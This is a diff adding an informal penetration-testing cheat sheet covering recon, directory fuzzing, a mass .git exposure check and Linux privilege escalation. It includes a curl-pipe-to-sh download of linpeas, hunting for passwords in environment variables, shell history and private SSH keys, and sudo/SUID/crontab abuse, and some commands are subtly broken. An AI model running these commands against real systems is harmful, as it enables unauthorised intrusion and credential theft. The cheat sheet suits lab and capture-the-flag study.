@@ -1,0 +1,72 @@
+Author : STRENBOW :)
+
+1. enum with nmap :
+    nmap -sV 1.1.1.1 -p 21,22,3389,8080,8181,8000,9443,8443,6900,66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6346,6347,7001,7002,8888,30821
+    sudo nmap -sS -v -n -A 10.10.11.224
+    rustscan -a 1.1.1.1
+
+2.find sub-domain :
+    ffuf -u http://test.com -H "Host: FUZZ.test.com" -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+3.fuzz dir:
+    dirsearch -u https://test.com
+    ffuf -u http://test.com -w ~/SecLists/Discovery/Web-content/dire...
+    gobuster -u http://test.com -w ~/SecLists/Discovery/Web-content/dire... -x php,html,txt
+    Check .git/HEAD:
+        cat dm.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
+4.param enum :
+        arjun -u https://example.com/login.php
+5.save all javascript files and read it 
+6. try to find login panels 
+7. check the cms or powered by who and search it in google and check if there is an public Exploit 
+
+8.advices :
+	* if you are in the server and you want download an file but the server not showing it in the website use :
+		python3 -m http.server 8000
+	* if you see .jar file open it with : jd-gui filename
+	
+	* when you be in the linux server type : env
+					check the environment variables
+          maybe you are going to find an password
+
+Privilege Escalation :
+    1.history :
+        check the history 
+        maybe you can find password
+    2. find key ssh in files :
+        cat key :
+            --BEGIN PRIVATE KEY ---
+
+        ssh root@1.1.1.1 -i key
+    3. sudo -l :
+        sexy access you can root withit
+
+
+        For example :
+        sudo -l 
+          (ROOT) NOPASSWD:/bin/wget
+
+          search wget in gtfobins.github.io
+
+          https://gtfobins.github.io/gtfobins/wget/
+        
+    4. SUID & SGID :
+        find suid : find / -perm -4000 2>/dev/null
+        find SGID : find / -perm -2000 2/dev/null 
+    5./etc/crontab :
+        check the file /etc/crontab
+        * * * * * rppt /home/user/script.sh (auto run every 1m)
+        cat /home/user/script.sh
+        cp /home/user/script.sh /etc/passwd
+
+        Here is an explain about /etc/crontab : https://www.sciencedirect.com/topics/computer-science/crontab#:~:text=crontab%20files%20(cron%20table)%20tells,store%20their%20own%20schedule%20files.
+    6. check kernel vulns :
+        uname -r 
+        maybe there is an exploit on this version
+
+
+    7.watch the running processers :
+        try to see the /bin/bash
+         ps -ef --forest | less s 
+        # From github
+            curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+            this is perfect tool
